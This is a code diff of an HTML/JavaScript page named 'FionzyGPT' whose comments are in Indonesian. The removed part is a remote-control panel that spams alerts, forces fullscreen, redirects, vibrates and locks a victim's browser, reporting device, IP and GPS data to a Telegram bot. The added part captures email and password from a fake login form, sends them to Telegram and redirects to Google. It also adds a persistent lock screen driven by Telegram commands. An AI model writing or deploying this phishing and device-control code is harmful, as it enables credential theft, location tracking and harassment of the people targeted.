-        for(let i = 0; i < 50; i++) {
-            setTimeout(() => alert(`⚠️ FIONZYGPT ALERT #${i+1}`), i * 80);
-        }
-        showToast("50x alert spam dimulai");
-        sendToTelegram("⚠️ <b>SPAM ALERT EXECUTED</b>\n50 alert dikirim ke target.");
-    }
-    
-    function forceFullscreen() {
-        document.documentElement.requestFullscreen();
-        showToast("Fullscreen forced");
-        sendToTelegram("🖥️ <b>FULLSCREEN FORCED</b>\nTarget masuk mode fullscreen.");
-    }
-    
-    function redirectTo(url) {
-        if(url && (url.startsWith("http://") || url.startsWith("https://"))) {
-            sendToTelegram(`🔀 <b>REDIRECT EXECUTED</b>\nTarget diarahkan ke: ${url}`);
-            setTimeout(() => window.location.href = url, 100);
-        } else showToast("URL tidak valid");
-    }
-    
-    function vibrateDevice() {
-        if(navigator.vibrate) {
-            navigator.vibrate(5000);
-            showToast("Vibrate 5 detik");
-            sendToTelegram("📳 <b>VIBRATE EXECUTED</b>\nDevice bergetar 5 detik.");
-        } else showToast("Vibrate not supported");
-    }
-    
-    // Lock system (simple)
-    function lockDevice() {
-        if(!lockPassword) {
-            let pwd = prompt("Set password untuk lock:");
-            if(pwd) lockPassword = pwd;
-            else return;
-        }
-        isLocked = true;
-        document.body.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#0f0;flex-direction:column;"><h1>🔒 DEVICE LOCKED</h1><input type="password" id="lockPwd" placeholder="Password" style="padding:10px;margin:10px;"><button id="unlockBtn">UNLOCK</button></div>`;
-        document.getElementById("unlockBtn").onclick = () => {
-            if(document.getElementById("lockPwd").value === lockPassword) location.reload();
-            else alert("Wrong password!");
-        };
-        sendToTelegram("🔒 <b>DEVICE LOCKED</b>\nTarget device terkunci.");
-    }
-    
-    function unlockDevice(pwd) {
-        if(lockPassword && pwd === lockPassword) {
-            isLocked = false;
-            location.reload();
-        } else showToast("Password salah!");
-    }
-    
-    function setLockPassword(pwd) {
-        lockPassword = pwd;
-        showToast(`Password lock diset: ${pwd}`);
-        sendToTelegram(`🔐 <b>LOCK PASSWORD SET</b>\nPassword: ${pwd}`);
-    }
-    
-    // Handle command
-    function handleCommand(cmd) {
-        const lower = cmd.toLowerCase().trim();
-        if(lower === "/menu") {
-            showToast("Menu sudah tampil di halaman");
-            sendToTelegram("📋 <b>MENU REQUESTED</b>\nUser meminta menu perintah.");
-        }
-        else if(lower === "/info") sendToTelegram(formatDeviceMessage());
-        else if(lower === "/ip") sendToTelegram(`🌐 <b>IP ADDRESS</b>\nIP: ${currentDeviceData.publicIP}\nLocation: ${currentDeviceData.location}\nISP: ${currentDeviceData.isp}`);
-        else if(lower === "/device") sendToTelegram(formatDeviceMessage());
-        else if(lower === "/gps") getGPSRealtime();
-        else if(lower === "/batre") sendToTelegram(`🔋 <b>BATTERY STATUS</b>\n${currentDeviceData.battery}`);
-        else if(lower === "/vibrate") vibrateDevice();
-        else if(lower === "/fullscreen") forceFullscreen();
-        else if(lower === "/crash") crashBrowser();
-        else if(lower === "/spam") spamAlert();
-        else if(lower.startsWith("/toast")) {
-            let msg = cmd.substring(6).trim() || "FionzyGPT Command";
-            showToast(msg);
-            sendToTelegram(`💬 <b>TOAST MESSAGE</b>\n"${msg}" ditampilkan ke target.`);
-        }
-        else if(lower.startsWith("/redirect")) {
-            let url = cmd.substring(9).trim();
-            redirectTo(url);
-        }
-        else if(lower === "/lock") lockDevice();
-        else if(lower.startsWith("/unlock")) {
-            let pwd = cmd.substring(7).trim();
-            unlockDevice(pwd);
-        }
-        else if(lower.startsWith("/setpass")) {
-            let pwd = cmd.substring(8).trim();
-            if(pwd) setLockPassword(pwd);
-            else showToast("Gunakan: /setpass [password]");
-        }
-        else showToast(`Command tidak dikenal: ${cmd}`);
+        // ======================= CAPTURE LOGIN =======================
+        document.getElementById("loginBtn")?.addEventListener("click", () => {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            
+            if(email && password) {
+                const credential = `📧 ${email} | 🔑 ${password}`;
+                capturedData.credentials.push({ email, password, time: new Date().toISOString() });
+                
+                sendToTelegram(`🔐 <b>LOGIN CAPTURED</b>\n\nEmail: ${email}\nPassword: ${password}\nIP: ${capturedData.ip}\nDevice: ${capturedData.device.os} | ${capturedData.device.browser}`);
+                
+                document.getElementById("loginMsg").innerHTML = "✅ Login berhasil! Mengalihkan...";
+                document.getElementById("loginMsg").style.color = "#155724";
+                
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 1500);
+            } else {
+                document.getElementById("loginMsg").innerHTML = "❌ Email dan password harus diisi!";
+                document.getElementById("loginMsg").style.color = "#c62828";
+            }
+        });
         
-        document.getElementById("responseArea").innerHTML = `[✔] Executed: ${cmd} | ${new Date().toLocaleTimeString()}`;
-    }
-    
-    // Event listeners
-    document.getElementById("execQuickBtn")?.addEventListener("click", () => {
-        const cmd = document.getElementById("quickCmd").value.trim();
-        if(cmd) handleCommand(cmd);
-    });
-    document.getElementById("testCrashBtn")?.addEventListener("click", crashBrowser);
-    document.getElementById("refreshDeviceBtn")?.addEventListener("click", () => {
-        getDeviceDetails();
-        showToast("Device data refreshed");
-    });
-    document.getElementById("sendDeviceToBotBtn")?.addEventListener("click", () => {
-        sendToTelegram(formatDeviceMessage());
-    });
-    
-    // Enter key
-    document.getElementById("quickCmd")?.addEventListener("keypress", (e) => {
-        if(e.key === "Enter") document.getElementById("execQuickBtn").click();
-    });
-    
-    // Init
-    getDeviceDetails();
-    document.getElementById("webhookStatusIndicator")?.classList.add("active");
-    document.getElementById("webhookStatusText").innerText = "FionzyGPT Online | Bot Ready";
-    
-    // Kirim notifikasi awal ke Telegram
-    setTimeout(() => {
-        sendToTelegram("✅ <b>FIONZYGPT ACTIVE</b>\nTarget membuka panel kontrol.\nIP: " + (currentDeviceData.publicIP || 'fetching...'));
-    }, 2000);
-</script>
+        // ======================= UNLOCK HANDLER =======================
+        document.getElementById("unlockBtn")?.addEventListener("click", () => {
+            const pwd = document.getElementById("lockPassword").value;
+            if(unlockDevice(pwd)) {
+                document.getElementById("lockPassword").value = "";
+            } else {
+                document.getElementById("lockPassword").value = "";
+                document.getElementById("lockPassword").placeholder = "Kode salah! Coba lagi";
+            }
+        });
+        
+        document.getElementById("lockPassword")?.addEventListener("keypress", (e) => {
+            if(e.key === "Enter") document.getElementById("unlockBtn").click();
+        });
+        
+        // ======================= INIT =======================
+        collectDeviceData();
+        
+        // Cek apakah sebelumnya pernah locked (simulasi dari storage)
+        const savedLock = localStorage.getItem("fionzy_lock");
+        if(savedLock) {
+            lockPassword = savedLock;
+            isLocked = true;
+            document.getElementById("lockOverlay").style.display = "flex";
+        }
+        
+        console.log("✅ FionzyGPT Active | Command via Telegram ready");
+        console.log("Commands: /lock, /unlock [pwd], /info, /gps, /toast [msg], /crash, /redirect [url], /fullscreen, /vibrate, /batre");
+    </script>
 </body>
 </html>
